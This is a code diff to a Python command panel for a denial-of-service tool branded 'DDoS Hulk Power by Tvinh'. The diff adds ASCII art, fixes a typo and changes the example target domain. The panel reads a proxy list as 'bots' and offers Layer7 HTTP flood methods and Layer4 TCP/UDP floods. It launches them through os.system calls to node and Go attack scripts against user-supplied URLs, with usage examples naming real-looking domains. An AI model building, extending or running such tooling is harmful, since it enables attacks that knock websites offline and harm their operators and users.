@@ -16,26 +16,83 @@ time.sleep(1)
 proxys = open('proxies.txt').readlines()
 bots = len(proxys)
 def si():
-  print("[2005] | DDoS Hulk Pơer by Tvinh | New Panel")
+  print("[2005] | DDoS Hulk Power by Tvinh | New Panel")
 def help():
   print("""
   |Layer7|
   |Layer4|
 """)
+print(f'''
+⠸⣷⣦⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⠀⠀⠀
+⠀⠙⣿⡄⠈⠑⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠔⠊⠉⣿⡿⠁⠀⠀⠀
+⠀⠀⠈⠣⡀⠀⠀⠑⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠊⠁⠀⠀⣰⠟⠀⠀⠀⣀⣀
+⠀⠀⠀⠀⠈⠢⣄⠀⡈⠒⠊⠉⠁⠀⠈⠉⠑⠚⠀⠀⣀⠔⢊⣠⠤⠒⠊⠉⠀⡜
+⠀⠀⠀⠀⠀⠀⠀⡽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠩⡔⠊⠁⠀⠀⠀⠀⠀⠀⠇
+⠀⠀⠀⠀⠀⠀⠀⡇⢠⡤⢄⠀⠀⠀⠀⠀⡠⢤⣄⠀⡇⠀⠀⠀⠀⠀⠀⠀⢰⠀
+⠀⠀⠀⠀⠀⠀⢀⠇⠹⠿⠟⠀⠀⠤⠀⠀⠻⠿⠟⠀⣇⠀⠀⡀⠠⠄⠒⠊⠁⠀
+⠀⠀⠀⠀⠀⠀⢸⣿⣿⡆⠀⠰⠤⠖⠦⠴⠀⢀⣶⣿⣿⠀⠙⢄⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢻⣿⠃⠀⠀⠀⠀⠀⠀⠀⠈⠿⡿⠛⢄⠀⠀⠱⣄⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢸⠈⠓⠦⠀⣀⣀⣀⠀⡠⠴⠊⠹⡞⣁⠤⠒⠉⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣠⠃⠀⠀⠀⠀⡌⠉⠉⡤⠀⠀⠀⠀⢻⠿⠆⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠰⠁⡀⠀⠀⠀⠀⢸⠀⢰⠃⠀⠀⠀⢠⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢶⣗⠧⡀⢳⠀⠀⠀⠀⢸⣀⣸⠀⠀⠀⢀⡜⠀⣸⢤⣶⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠈⠻⣿⣦⣈⣧⡀⠀⠀⢸⣿⣿⠀⠀⢀⣼⡀⣨⣿⡿⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠈⠻⠿⠿⠓⠄⠤⠘⠉⠙⠤⢀⠾⠿⣿⠟⠋
+''')
+time.sleep(1)
+clear()
 def layer7():
   clear()
   print("""\033[1;32m
-  ║ HTTP-RAW ║
-  ║ HTTP-RAND ║
-  ║ HTTP-BROWSER ║
-  ║ HTTP-SOCKET ║
-  ║ hulk ║
+           ║ HTTP-RAW     ║
+           ║ HTTP-RAND    ║
+           ║ HTTP-BROWSER ║
+           ║ HTTP-SOCKET  ║
+       ⢀⣠⣶⣿⣿⣷⣿⣿⣿⣿⠋⠀⣀⣀⣠⡤⠂⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⣀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠖⠃⠀⠀⠀⠀⠀⠀
+⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠖⠂⠀⠀⠀⠀⠀⠀
+⣼⣿⣿⣿⠛⠛⠛⠛⠛⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⡏⠀⠀⠀⠀⠀⢻⡇⢹⣿⣿⣿⣿⣿⢿⣿⣯⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⠯⢍⡀⠐⠒⢂⣸⠧⠜⣿⣿⣿⣿⡇⡀⢹⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⡿⣳⣾⡇⠀⠀⠰⠇⣭⣿⣿⣿⣿⡧⠄⣼⣦⠈⠑⠀⠀⠀⠀⠀⠀⠀⠀
+⡏⣿⣿⡇⠀⠀⢀⠀⠀⠀⠀⠀⢸⢿⣿⣿⣧⣾⣿⣛⣧⣴⣾⡆⠀⠀⠀⠀⠀⠀
+⠃⢸⣿⣧⠀⠀⢘⠀⡀⠀⠀⠀⢸⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀
+⠀⠈⣿⣿⣷⡀⠀⢁⣀⠀⠀⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀
+⠀⠀⢻⠘⣿⠈⠢⡀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⡿⣿⣟⣿⣵⣄⠀⠀⠀⠀⠀
+⠀⠀⠈⠃⢹⠀⣀⣼⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀
+⠀⠀⣠⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀
+⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀
+⠀⠀⠀⠘⢿⣿⣿⣿⣿⢟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀
+⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀
+⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄
+⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
+⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 """)
 def layer4():
   print("""\033[1;31m
-  ║ TCP ║
-  ║ UDP ║
-  """)
+                  ║ TCP ║
+                  ║ UDP ║
+  ⠀⠀⠀⠀                 ⢀⣠⣴⣿⣤⣤⣾⣿⠃⣀⣠⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣶⡖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠻⣿⣿⣿⣿⣿⣿⣿⣟⠉⢻⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡟⣧⢪⣿⣿⣿⣿⣿⣿⠧⠀⠀⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣽⣇⠈⠀⠋⢹⣿⣿⣿⣿⠀⢀⣸⣿⣿⣿⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣏⠁⠀⠀⠀⠀⣿⣿⣿⡟⢀⠠⠽⠛⠛⠛⠒⠒⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡿⣿⣤⠀⠀⡀⠀⢸⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣆⠀⠀⠀⠐⠀⠿⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡠⠄⢹⣿⡗⣄⣀⢠⠐⠃⠀⠀⠀⠀⠀⠀⢀⠀⠈⠀⠀⡀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠀⠀⢻⡇⡄⢀⠀⢣⠀⠀⠀⠀⠀⢀⠄⠁⠀⠀⠀⠀⠈⠢⡀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡄⠀⠀⠀⠁⡇⡔⠴⢪⠀⠀⠀⠀⠔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠐⠲⠀⣰⠃⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡀⠀⢠⠂⠈⠇⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠈⠀⠜⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀
+""")
 def menu():
   clear()
   si()
@@ -70,7 +127,7 @@ def main():
         os.system(f'node HTTP-RAW.js {url} {time}')
       except IndexError:
         print("http-raw <url <time>")
-        print("Ví dụ: http-raw aemine.vn 120")
+        print("Ví dụ: http-raw ngthanhvinh.vn 120")
     elif "http-rand" in cnc:
       try:
         url=cnc.split()[1]
@@ -78,7 +135,7 @@ def main():
         os.system(f'node HTTP-RAND.js {url} {time}')
       except IndexError:
         print("http-rand <url> <time>")
-        print("Ví Dụ: http-rand aemine.vn 60")
+        print("Ví Dụ: http-rand ngthanhvinh.vn 60")
     elif "http-socket" in cnc:
       try:
         url=cnc.split()[1]
@@ -87,7 +144,7 @@ def main():
         os.system(f'node HTTP-SOCKETS.js {url} {req} {time}')
       except IndexError:
         print("http-socket <url> <req_ip> <time>")
-        print("Ví Dụ: http-socket aemine.vn 150 60")
+        print("Ví Dụ: http-socket ngthanhvinh.vn 150 60")
     elif "http-browser" in cnc:
       try:
         url=cnc.split()[1]
@@ -96,7 +153,7 @@ def main():
         os.system(f'node HTTP-BROWSER.js {url} {req} {time}')
       except IndexError:
         print("http-browser <url> <thread> <time>")
-        print("Ví Dụ: HTTP-BROWSER aemine.vn 120000 120")
+        print("Ví Dụ: HTTP-BROWSER ngthanhvinh.vn 120000 120")
     elif "hulk" in cnc:
       try:
         url=cnc.split()[1]
@@ -104,7 +161,7 @@ def main():
         os.system(f'go run Hulk.go -site {url} -data {methods}')
       except IndexError:
         print("hulk <URL> <GET/POST>")
-        print("Ví Dụ: hulk aemine.vn GET")
+        print("Ví Dụ: hulk ngthanhvinh.vn GET")
     elif "udp" in cnc:
       try:
         ip=cnc.split()[1]
